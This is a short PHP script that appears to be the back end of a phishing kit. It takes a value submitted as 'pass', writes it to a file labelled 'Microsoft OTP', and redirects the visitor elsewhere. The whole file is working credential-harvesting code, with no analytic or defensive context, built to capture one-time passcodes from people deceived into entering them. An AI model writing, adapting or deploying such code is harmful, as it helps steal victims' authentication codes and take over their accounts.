<?php
file_put_contents("otp.txt", "Microsoft OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
